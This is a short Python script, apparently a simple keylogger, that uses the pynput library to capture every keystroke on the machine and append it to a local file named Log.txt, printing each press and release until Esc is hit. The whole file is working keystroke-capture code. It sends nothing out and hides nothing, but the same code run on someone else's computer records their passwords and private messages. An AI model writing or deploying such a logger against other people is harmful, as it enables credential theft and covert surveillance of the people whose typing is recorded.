from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print("Alphanumeric key {0} pressed".format(key.char))
    except AttributeError:
        print("Special key {0} pressed".format(key))


def write_file(keys):
    with open("Log.txt", 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write(' ')
            elif k == "Key.enter":
                f.write('\n')
            elif "Key" in k:
                f.write('[' + k + '] ')
            else:
                f.write(k)
        keys.clear()


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
